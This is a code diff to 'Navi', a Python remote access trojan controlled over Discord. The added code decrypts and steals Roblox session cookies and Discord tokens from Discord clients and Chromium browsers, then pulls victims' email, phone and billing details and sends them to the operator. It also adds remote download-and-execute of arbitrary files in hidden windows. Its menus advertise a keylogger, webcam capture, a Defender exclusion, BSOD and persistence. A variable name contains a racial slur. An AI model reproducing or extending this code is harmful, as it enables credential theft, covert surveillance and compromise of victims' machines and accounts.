@@ -15,10 +15,11 @@ import platform
 import struct as _struct
 import subprocess
 import urllib.request
-
+import shutil
 from zipfile import ZipFile
 from ctypes import *
 
+import tempfile
 import requests
 from requests import get
 
@@ -50,7 +51,7 @@ appdata = os.getenv('APPDATA')
 intents = discord.Intents.default()
 intents.message_content = True
 
-bot = commands.Bot(command_prefix='!', intents=intents)
+bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
 
 def navi_embed(text, color=0x00aaff, thumbnail=True):
     embed = discord.Embed(title="NAVI • TERMINAL", description=text, color=color)
@@ -58,8 +59,6 @@ def navi_embed(text, color=0x00aaff, thumbnail=True):
         embed.set_thumbnail(url="https://i.ibb.co/kg532m6B/avatars-000615381687-t475ap-t240x240-removebg-preview.png")
     embed.set_footer(text="Navi Multitool • https://github.com/glockinhand/navi-multitool", icon_url="https://i.ibb.co/kg532m6B/avatars-000615381687-t475ap-t240x240-removebg-preview.png")
     return embed
-
-
 
 def hide_and_persist():
     try:
@@ -72,7 +71,6 @@ def hide_and_persist():
     except Exception: pass
 
 hide_and_persist()
-
 
 async def activity(client):
     while True:
@@ -89,6 +87,216 @@ def between_callback(client):
     asyncio.set_event_loop(loop)
     loop.run_until_complete(activity(client))
     loop.close()
+
+def fetch_roblox_sex(cookie):
+    headers = {"Cookie": f".ROBLOSECURITY={cookie}"}
+    try:
+        user_res = requests.get("https://users.roblox.com/v1/users/authenticated", headers=headers, timeout=10)
+        if user_res.status_code != 200:
+            return None
+        user_data = user_res.json()
+        user_id = user_data["id"]
+        username = user_data["name"]
+        display_name = user_data.get("displayName", "N/A")
+
+        robux_res = requests.get(f"https://economy.roblox.com/v1/users/{user_id}/currency", headers=headers, timeout=10)
+        robux = robux_res.json().get("robux", 0) if robux_res.status_code == 200 else 0
+
+        prem_res = requests.get(f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership", headers=headers, timeout=10)
+        is_premium = prem_res.json() if prem_res.status_code == 200 else False
+
+        thumb_res = requests.get(
+            f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={user_id}&size=150x150&format=Png",
+            headers=headers, timeout=10
+        )
+        avatar_url = ""
+        if thumb_res.status_code == 200:
+            thumb_data = thumb_res.json()
+            if thumb_data.get("data"):
+                avatar_url = thumb_data["data"][0].get("imageUrl", "")
+        return {
+            "id": user_id,
+            "name": username,
+            "display_name": display_name,
+            "robux": robux,
+            "premium": is_premium,
+            "profile_url": f"https://www.roblox.com/users/{user_id}/profile",
+            "avatar_url": avatar_url
+        }
+    except Exception:
+        return None
+
+def get_roblox_sex():
+    user_profile = os.getenv("USERPROFILE", "")
+    roblox_cookies_path = os.path.join(user_profile, "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat")
+    if not os.path.exists(roblox_cookies_path):
+        return None, "Roblox cookie file not found."
+    temp_dir = os.getenv("TEMP", "")
+    destination_path = os.path.join(temp_dir, "RobloxCookies.dat")
+    try:
+        shutil.copy(roblox_cookies_path, destination_path)
+    except Exception as e:
+        return None, f"Failed to copy cookie file: {e}"
+    decrypted_cookie = None
+    try:
+        with open(destination_path, 'r', encoding='utf-8') as file:
+            try:
+                file_content = json.load(file)
+                encoded_cookies = file_content.get("CookiesData", "")
+                if encoded_cookies:
+                    decoded_cookies = base64.b64decode(encoded_cookies)
+                    try:
+                        from win32crypt import CryptUnprotectData
+                        decrypted_bytes = CryptUnprotectData(decoded_cookies, None, None, None, 0)[1]
+                        decrypted_cookie = decrypted_bytes.decode('utf-8', errors='ignore')
+                    except Exception as e:
+                        return None, f"Decryption failed: {e}"
+                else:
+                    return None, "No CookiesData found in file."
+            except json.JSONDecodeError as e:
+                return None, f"JSON decode error: {e}"
+    except Exception as e:
+        return None, f"Read error: {e}"
+    finally:
+        if os.path.exists(destination_path):
+            try:
+                os.remove(destination_path)
+            except Exception:
+                pass
+    if not decrypted_cookie:
+        return None, "Decrypted cookie is empty."
+    match = re.search(r'(_\|WARNING:.*?);', decrypted_cookie)
+    if not match:
+        return None, "Could not extract .ROBLOSECURITY token from decrypted data."
+    token = match.group(1)
+    info = fetch_roblox_sex(token)
+    if not info:
+        return None, "Token is invalid or Roblox API returned an error."
+    return info, token
+
+class DiscordMod:
+    def __init__(self):
+        self.app = os.getenv('APPDATA')
+        self.loc = os.getenv('LOCALAPPDATA')
+        self.tmp = os.getenv('TEMP')
+        self.tokens = []
+        self.totals = {"disc": 0}
+
+    def _log(self, msg):
+        print(f"[+] {msg}")
+
+    def disc_tget(self):
+        try:
+            self._log("Extracting Discord tokens...")
+            try:
+                from Crypto.Cipher import AES
+                from win32crypt import CryptUnprotectData
+            except:
+                return
+
+            _tks = []
+            _ps = {
+                "Discord": self.app + "\\Discord",
+                "Canary": self.app + "\\discordcanary",
+                "PTB": self.app + "\\discordptb",
+                "Lightcord": self.app + "\\Lightcord",
+                "Chrome": self.loc + "\\Google\\Chrome\\User Data",
+                "Brave": self.loc + "\\BraveSoftware\\Brave-Browser\\User Data",
+                "Edge": self.loc + "\\Microsoft\\Edge\\User Data"
+            }
+
+            for n, p in _ps.items():
+                niggers = ["discord", "canary", "ptb", "lightcord"]
+                _bases = [p] if any(name.lower() in n.lower() for name in niggers) else [
+                    os.path.join(p, pr) for pr in ["Default", "Profile 1", "Profile 2", "Profile 3", "Guest"]
+                ]
+                _mk = None
+                _ls = os.path.join(p, "Local State")
+                if os.path.exists(_ls):
+                    try:
+                        with open(_ls, "r", encoding="utf-8") as f:
+                            _k = json.load(f)["os_crypt"]["encrypted_key"]
+                            _mk = CryptUnprotectData(base64.b64decode(_k)[5:], None, None, None, 0)[1]
+                    except:
+                        pass
+
+                for b in _bases:
+                    _ld = os.path.join(b, "Local Storage", "leveldb")
+                    if not os.path.exists(_ld):
+                        continue
+                    for f in os.listdir(_ld):
+                        if f.endswith(".log") or f.endswith(".ldb"):
+                            try:
+                                with open(os.path.join(_ld, f), "rb") as h:
+                                    _content = h.read().decode(errors="ignore")
+                                    for t in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}", _content):
+                                        if t not in _tks:
+                                            _tks.append(t)
+                                    if _mk:
+                                        for t in re.findall(r"dQw4w9WgXcQ:([^\"]*)", _content):
+                                            try:
+                                                _enc = base64.b64decode(t)
+                                                iv, pl = _enc[3:15], _enc[15:]
+                                                _dec = AES.new(_mk, AES.MODE_GCM, iv).decrypt(pl)[:-16].decode()
+                                                if _dec not in _tks:
+                                                    _tks.append(_dec)
+                                            except:
+                                                pass
+                            except:
+                                pass
+
+            _res = ""
+            for t in _tks:
+                h = {
+                    "Authorization": t,
+                    "Content-Type": "application/json",
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
+                }
+                try:
+                    r = requests.get("https://discord.com/api/v9/users/@me", headers=h, timeout=5)
+                    if r.status_code == 200:
+                        j = r.json()
+                        un = f"{j['username']}"
+                        uid = j['id']
+                        em = j.get('email', 'N/A')
+                        ph = j.get('phone', 'N/A')
+                        nit = "None"
+                        nt = j.get("premium_type", 0)
+                        if nt == 1:
+                            nit = "Nitro Classic"
+                        elif nt == 2:
+                            nit = "Nitro Boost"
+                        bill = "None"
+                        try:
+                            br = requests.get("https://discord.com/api/v9/users/@me/billing/payment-sources", headers=h, timeout=5)
+                            if br.status_code == 200:
+                                bj = br.json()
+                                if len(bj) > 0:
+                                    bill = ""
+                                    for b in bj:
+                                        if b['type'] == 1:
+                                            bill += "<a:6337creditcard:1505905221908566016> Card "
+                                        elif b['type'] == 2:
+                                            bill += "<a:771036paypal:1505905194506911805> PayPal "
+                        except:
+                            pass
+                        _res += f"Token: {t}\nUser: {un} ({uid})\nEmail: {em}\nPhone: {ph}\nNitro: {nit}\nBilling: {bill}\n\n"
+                        if not any(x['t'] == t for x in self.tokens):
+                            self.tokens.append({
+                                "u": un, "id": uid, "e": em, "p": ph,
+                                "t": t, "n": nit, "b": bill
+                            })
+                            self.totals["disc"] += 1
+                except:
+                    pass
+
+            if _res:
+                out_path = os.path.join(self.tmp, "discord_tokens.txt")
+                with open(out_path, "w", encoding="utf-8") as f:
+                    f.write(_res)
+            self._log(f"Discord Tokens Found: {len(self.tokens)}")
+        except Exception as e:
+            self._log(f"Discord Token Error: {e}")
 
 @bot.event
 async def on_ready():
@@ -133,12 +341,323 @@ async def on_ready():
     game = discord.Game(f"Window logging stopped")
     await bot.change_presence(status=discord.Status.online, activity=game)
 
-
 def volumeup():
     os.system("powershell -c (New-Object -ComObject WScript.Shell).SendKeys([char]175)")
 
 def volumedown():
     os.system("powershell -c (New-Object -ComObject WScript.Shell).SendKeys([char]174)")
+
+thumb = "https://i.ibb.co/kg532m6B/avatars-000615381687-t475ap-t240x240-removebg-preview.png"
+def get_embed(page: str):
+    e = discord.Embed(title="NAVI • COMMANDS", color=0x00aaff)
+    e.set_thumbnail(url=thumb)
+
+    if page == "main":
+        e.description = (
+            "📡 **All Commands & Info**\n\n"
+            "Use dropdown below to switch categories\n\n"
+            "🔑 = Admin required\n"
+            "⚠️ = May trigger AV\n"
+        )
+
+    if page == "system":
+        e.description = (
+            "📡 **System Commands**\n\n"
+            "`!sysinfo` – System & IP info\n"
+            "`!admincheck` – Check admin privileges\n"
+            "`!geolocate` – Geolocate via IP\n"
+            "`!idletime` – User idle duration\n"
+            "`!getadmin` – Request admin privileges (UAC)\n"
+            "`!disabledefender` – Exclude C:\\ from Defender 🔑"
+        )
+
+    elif page == "files":
+        e.description = (
+            "📂 **File Management**\n\n"
+            "`!cd <path>` – Change directory\n"
+            "`!download <file>` – Download from target\n"
+            "`!upload <file>` – Upload to target"
+        )
+
+    elif page == "exec":
+        e.description = (
+            "⚡ **Execution**\n\n"
+            "`!execute <file>` – Upload and execute a file (attach file)\n"
+            "`!shell <cmd>` – Execute shell command\n"
+            "`!write <text>` – Type text\n"
+            "`!voice <text>` – Text-to-speech\n"
+            "`!sing <url>` – Play YouTube hidden\n"
+            "`!stopsing` – Stop playback"
+        )
+
+    elif page == "surveillance":
+        e.description = (
+            "👁️ **Surveillance**\n\n"
+            "`!screenshot` – Capture screen\n"
+            "`!screenrecord <sec>` – Record screen\n"
+            "`!webcampic` – Webcam snapshot\n"
+            "`!clipboard` – Clipboard content\n"
+            "`!history` – Browser history\n"
+            "`!windowstart / !windowstop` – Window logging\n"
+            "`!discord` – Steal discord tokens\n"
+            "`!roblox` – Steal roblox cookies"
+        )
+
+    elif page == "keylogger":
+        e.description = (
+            "⌨️ **Keylogger**\n\n"
+            "`!startkeylogger` – Start ⚠️\n"
+            "`!stopkeylogger` – Stop\n"
+            "`!dumpkeylogger` – Dump logs"
+        )
+
+    elif page == "trolling":
+        e.description = (
+            "🎭 **Trolling**\n\n"
+            "`!message <text>` - Show message box\n"
+            "`!fakeerror <count> <text>` - Spam error boxes\n"
+            "`!jumpscare` - Fullscreen scare + loud sound\n"
+            "`!wallpaper` - Change wallpaper (attach img)\n"
+            "`!flipscreen / !reset` - Flip screen trick\n"
+            "`!crazymouse <sec>` - Random mouse movement\n"
+            "`!earthquake <sec>` - Shake all windows\n"
+            "`!spamtts <count> <text>` - Spam TTS voice\n"
+            "`!beep <count>` – System beep spam\n"
+            "`!rickroll` - Classic rickroll\n"
+            "`!opencd / !closecd` - CD tray control\n"
+            "`!swapbuttons / !unswapbuttons` - Swap mouse LR\n"
+            "`!volumemax / !volumezero` – Volume control\n"
+            "`!blockinput / !unblockinput` – Block I/O 🔑\n"
+            "`!hidedesktop` – Toggle desktop icons\n"
+            "`!disabletaskmgr / !enabletaskmgr` – Task manager 🔑\n"
+        )
+
+    elif page == "destructive":
+        e.description = (
+            "☠️ **Destructive**\n\n"
+            "`!shutdown <sec>`\n"
+            "`!restart`\n"
+            "`!logoff`\n"
+            "`!critproc` 🔑\n"
+            "`!uncritproc` 🔑\n"
+            "`!bsod` 🔑"
+        )
+
+    elif page == "session":
+        e.description = (
+            "🔧 **Session**\n\n"
+            "`!exit`\n"
+            "`!kill <session/all>`"
+        )
+
+    e.set_footer(text="Navi Rat • github.com/glockinhand/navi-multitool")
+    return e
+
+class HelpSelect(discord.ui.Select):
+    def __init__(self):
+        options = [
+            discord.SelectOption(label="📡 System", value="system"),
+            discord.SelectOption(label="📂 Files", value="files"),
+            discord.SelectOption(label="⚡ Execution", value="exec"),
+            discord.SelectOption(label="👁️ Surveillance", value="surveillance"),
+            discord.SelectOption(label="⌨️ Keylogger", value="keylogger"),
+            discord.SelectOption(label="🎭 Trolling", value="trolling"),
+            discord.SelectOption(label="☠️ Destructive", value="destructive"),
+            discord.SelectOption(label="🔧 Session", value="session"),
+        ]
+
+        super().__init__(
+            placeholder="select...",
+            options=options,
+            min_values=1,
+            max_values=1
+        )
+
+    async def callback(self, interaction: discord.Interaction):
+        page = self.values[0]
+        await interaction.response.edit_message(
+            embed=get_embed(page),
+            view=self.view
+        )
+
+
+class HelpView(discord.ui.View):
+    def __init__(self):
+        super().__init__(timeout=300)
+        self.add_item(HelpSelect())
+
+
+@bot.command()
+async def help(ctx):
+    await ctx.send(embed=get_embed("main"), view=HelpView())
+
+EXEC_MAP = {
+    ".py":   (sys.executable,       False, None),
+    ".bat":  (["cmd.exe", "/c"],     True,  None),
+    ".cmd":  (["cmd.exe", "/c"],     True,  None),
+    ".ps1":  (["powershell.exe", "-ExecutionPolicy", "Bypass", "-File"], True, "powershell.exe"),
+    ".vbs":  (["cscript.exe", "//Nologo"], True, "cscript.exe"),
+    ".js":   (["cscript.exe", "//Nologo"], True, "cscript.exe"),
+    ".sh":   (["bash"],              False, "bash"),
+    ".exe":  (None,                  True,  None),
+    ".com":  (None,                  True,  None),
+    ".msi":  (["msiexec.exe", "/i"], True, "msiexec.exe"),
+}
+DEFAULT_EXEC = (None, True, None)
+
+def run_with_fallback(cmd, use_shell, cwd, hide_window=True):
+    flags = 0
+    if hide_window and sys.platform == "win32" and hasattr(subprocess, 'CREATE_NO_WINDOW'):
+        flags = subprocess.CREATE_NO_WINDOW
+
+    proc = subprocess.Popen(
+        cmd,
+        shell=use_shell,
+        cwd=cwd,
+        stdin=subprocess.DEVNULL,
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL,
+        creationflags=flags
+    )
+    time.sleep(0.5)
+    ret = proc.poll()
+    if ret is not None and hide_window:
+        if ret == 0:
+            return proc, None
+        if sys.platform == "win32":
+            proc = subprocess.Popen(
+                cmd,
+                shell=use_shell,
+                cwd=cwd,
+                stdin=subprocess.DEVNULL,
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL
+            )
+            time.sleep(0.5)
+            ret = proc.poll()
+            if ret is not None:
+                return proc, f"Process exited with code {ret}"
+            return proc, None
+        else:
+            return proc, f"Process exited with code {ret}"
+    return proc, None
+
+@bot.command(name="execute")
+async def upload_and_run(ctx: commands.Context):
+    if not ctx.message.attachments:
+        await ctx.send("Navi needs a file attached.")
+        return
+    attachment = ctx.message.attachments[0]
+    filename = attachment.filename
+    ext = os.path.splitext(filename)[1].lower()
+    interpreter_cmd, use_shell, check_bin = EXEC_MAP.get(ext, DEFAULT_EXEC)
+    if check_bin:
+        try:
+            subprocess.run(
+                [check_bin, "--version"] if sys.platform != "win32" else [check_bin],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL
+            )
+        except FileNotFoundError:
+            await ctx.send(f"Navi can't run **{ext}** — `{check_bin}` not in PATH.")
+            return
+
+    temp_dir = tempfile.gettempdir()
+    file_path = os.path.join(temp_dir, filename)
+    try:
+        await attachment.save(file_path)
+    except Exception as e:
+        await ctx.send(f"Download failed: {e}")
+        return
+    if sys.platform != "win32":
+        os.chmod(file_path, 0o755)
+    if interpreter_cmd is None:
+        cmd = file_path if use_shell else [file_path]
+    else:
+        if isinstance(interpreter_cmd, list):
+            cmd = interpreter_cmd + [file_path]
+        else:
+            cmd = [interpreter_cmd, file_path]
+    proc, error = run_with_fallback(cmd, use_shell, temp_dir)
+
+    if error:
+        await ctx.send(f"Navi executed **{filename}** but process died: {error}")
+    else:
+        await ctx.send(f"Navi executed **{filename}** from **{temp_dir}** (PID: {proc.pid})")
+
+@bot.command(name="roblox")
+async def roblox(ctx):
+    await ctx.send("Navi is searching for cookies on victim pc...")
+    info, token_or_error = get_roblox_sex()
+    if info is None:
+        await ctx.send(f"Navi failed: {token_or_error}")
+        return
+    embed = discord.Embed(
+        title=":video_game: Roblox Account Captured",
+        color=0x00A3FF
+    )
+    embed.set_thumbnail(url=info["avatar_url"])
+    embed.add_field(name="Username:", value=f"[{info['name']}]({info['profile_url']})", inline=True)
+    embed.add_field(name="Display Name:", value=info["display_name"], inline=True)
+    embed.add_field(name="User ID:", value=str(info["id"]), inline=True)
+    embed.add_field(name=":money_with_wings: Robux:", value=f"{info['robux']} R$", inline=True)
+    embed.add_field(name=":video_game: Premium:", value="✅ Yes" if info["premium"] else "❌ No", inline=True)
+    embed.add_field(name="Target PC:", value=f"{os.getenv('COMPUTERNAME')}\\{os.getenv('USERNAME')}", inline=True)
+    token = token_or_error
+    chunk_size = 1000
+    if len(token) > chunk_size:
+        chunks = [token[i:i+chunk_size] for i in range(0, len(token), chunk_size)]
+        for idx, chunk in enumerate(chunks):
+            embed.add_field(name=f"Token Part {idx+1}/{len(chunks)}", value=f"```\n{chunk}\n```", inline=False)
+    else:
+        embed.add_field(name="Token", value=f"```\n{token}\n```", inline=False)
+
+    embed.set_footer(text=f"Navi Multitool | https://github.com/glockinhand")
+
+    await ctx.send(embed=embed)
+
+@bot.command(name="discord")
+async def grab_tokens(ctx):
+    await ctx.send("Navi is searching for tokens on victim pc...")
+    grabber = DiscordMod()
+    grabber.disc_tget()
+    count = len(grabber.tokens)
+    if count == 0:
+        await ctx.send("Navi found no tokens on this machine.")
+        return
+    embeds_to_send = []
+    for t in grabber.tokens[:9]:
+        h = {
+            "Authorization": t["t"],
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
+        }
+        try:
+            r = requests.get("https://discord.com/api/v10/users/@me", headers=h, timeout=5)
+            if r.status_code == 200:
+                userjson = r.json()
+                pic = userjson.get("avatar")
+                uid = userjson.get("id")
+                pfp = f"https://cdn.discordapp.com/avatars/{uid}/{pic}" if pic else "https://i.ibb.co/0R0MPTwz/avatars-000615381687-t475ap-t240x240-removebg-preview.png"
+            else:
+                pfp = "https://i.ibb.co/0R0MPTwz/avatars-000615381687-t475ap-t240x240-removebg-preview.png"
+        except Exception:
+            pfp = "https://i.ibb.co/0R0MPTwz/avatars-000615381687-t475ap-t240x240-removebg-preview.png"
+        embed = discord.Embed(
+            title=f"Token Info: {t['u']}",
+            color=0x00A3FF
+        )
+        embed.set_thumbnail(url=pfp)
+        embed.add_field(name=":id: ID:", value=f"`{t['id']}`", inline=True)
+        embed.add_field(name=":envelope: Email:", value=f"`{t['e']}`", inline=True)
+        embed.add_field(name="📱 Phone:", value=f"`{t['p']}`", inline=True)
+        embed.add_field(name=":gem: Nitro:", value=t['n'], inline=False)
+        embed.add_field(name=":money_with_wings: Billing:", value=t['b'], inline=False)
+        embed.add_field(name=":key: Token:", value=f"```{t['t']}```", inline=False)
+        embed.set_footer(text="Navi Rat • github.com/glockinhand/navi-multitool")
+        embeds_to_send.append(embed)
+    await ctx.send(embeds=embeds_to_send)
+    await ctx.send(f"Navi found **{len(embeds_to_send)}** tokens on victim pc.")
 
 @bot.event
 async def on_message(message):
@@ -282,87 +801,6 @@ async def on_message(message):
     if message.content.startswith("!cd"):
         os.chdir(message.content[4:])
         await message.channel.send(embed=navi_embed(f"📂 **Directory Update:** Current path: `{os.getcwd()}`"))
-
-    if message.content == "!help":
-        thumb = "https://i.ibb.co/kg532m6B/avatars-000615381687-t475ap-t240x240-removebg-preview.png"
-        foot = "Navi Multitool • github.com/glockinhand/navi-multitool"
-        e1 = discord.Embed(title="NAVI • COMMANDS (1/2)", color=0x00aaff)
-        e1.set_thumbnail(url=thumb)
-        e1.add_field(name="📡 System", value=(
-            "`!sysinfo` – System & IP info\n"
-            "`!admincheck` – Check admin privileges\n"
-            "`!geolocate` – Geolocate via IP\n"
-            "`!idletime` – User idle duration\n"
-            "`!getadmin` – Request admin privileges (UAC)\n"
-            "`!disabledefender` – Exclude C:\\ from Defender 🔑"
-        ), inline=False)
-        e1.add_field(name="📂 File Management", value=(
-            "`!cd <path>` – Change directory\n"
-            "`!download <file>` – Download from target\n"
-            "`!upload <file>` – Upload to target (attach file)"
-        ), inline=False)
-        e1.add_field(name="⚡ Execution", value=(
-            "`!shell <cmd>` – Execute shell command\n"
-            "`!write <text>` – Type text on target\n"
-            "`!voice <text>` – Text-to-speech\n"
-            "`!sing <url>` – Play YouTube hidden\n"
-            "`!stopsing` – Stop playback"
-        ), inline=False)
-        e1.add_field(name="👁️ Surveillance", value=(
-            "`!screenshot` – Capture screen\n"
-            "`!screenrecord <sec>` – Record screen (1-30s)\n"
-            "`!webcampic` – Webcam snapshot\n"
-            "`!clipboard` – Clipboard content\n"
-            "`!history` – Browser history\n"
-            "`!windowstart` / `!windowstop` – Window logging"
-        ), inline=False)
-        e1.add_field(name="⌨️ Keylogger", value=(
-            "`!startkeylogger` – Start keylogger ⚠️\n"
-            "`!stopkeylogger` – Stop keylogger\n"
-            "`!dumpkeylogger` – Dump keylog file"
-        ), inline=False)
-        e1.set_footer(text=f"🔑 = Admin required • ⚠️ = May trigger AV • Page 1/3", icon_url=thumb)
-        e2 = discord.Embed(title="NAVI • COMMANDS (2/3)", color=0x00aaff)
-        e2.set_thumbnail(url=thumb)
-        e2.add_field(name="🎭 Trolling", value=(
-            "`!message <text>` – Show message box\n"
-            "`!fakeerror <count> <text>` – Spam error boxes\n"
-            "`!jumpscare` – Fullscreen scare + loud sound\n"
-            "`!wallpaper` – Change wallpaper (attach img)\n"
-            "`!flipscreen` – Flip screen trick / `reset`\n"
-            "`!crazymouse <sec>` – Random mouse movement\n"
-            "`!earthquake <sec>` – Shake all windows\n"
-            "`!spamtts <count> <text>` – Spam TTS voice\n"
-            "`!beep <count>` – System beep spam\n"
-            "`!rickroll` – Classic rickroll\n"
-            "`!opencd` / `!closecd` – CD tray control\n"
-            "`!swapbuttons` / `!unswapbuttons` – Swap mouse LR"
-        ), inline=False)
-        e2.set_footer(text=f"🔑 = Admin required • ⚠️ = May trigger AV • Page 2/3", icon_url=thumb)
-        e3 = discord.Embed(title="NAVI • COMMANDS (3/3)", color=0x00aaff)
-        e3.set_thumbnail(url=thumb)
-        e3.add_field(name="🎭 Trolling (cont.)", value=(
-            "`!volumemax` / `!volumezero` – Volume control\n"
-            "`!blockinput` / `!unblockinput` – Block I/O 🔑\n"
-            "`!hidedesktop` – Toggle desktop icons\n"
-            "`!disabletaskmgr` / `!enabletaskmgr` – Task manager 🔑"
-        ), inline=False)
-        e3.add_field(name="☠️ Destructive", value=(
-            "`!shutdown <sec>` – Shutdown with timer\n"
-            "`!restart` – Restart PC\n"
-            "`!logoff` – Log off user\n"
-            "`!critproc` – Make process critical (BSOD on kill) 🔑\n"
-            "`!uncritproc` – Remove critical flag 🔑\n"
-            "`!bsod` – Blue screen of death 🔑"
-        ), inline=False)
-        e3.add_field(name="🔧 Session", value=(
-            "`!exit` – Exit stub\n"
-            "`!kill <session/all>` – Kill sessions"
-        ), inline=False)
-        e3.set_footer(text=f"🔑 = Admin required • ⚠️ = May trigger AV • Page 3/3", icon_url=thumb)
-        await message.channel.send(embed=e1)
-        await message.channel.send(embed=e2)
-        await message.channel.send(embed=e3)
 
     if message.content.startswith("!write"):
         if message.content[7:] == "enter":
@@ -822,5 +1260,7 @@ async def on_message(message):
             await message.channel.send(embed=navi_embed(f"🔊 **Beep:** Spamming {count} beeps."))
         except ValueError:
             await message.channel.send(embed=navi_embed("Syntax: `!beep <count>`", color=0xff0000))
+
+    await bot.process_commands(message)
 
 bot.run(token)
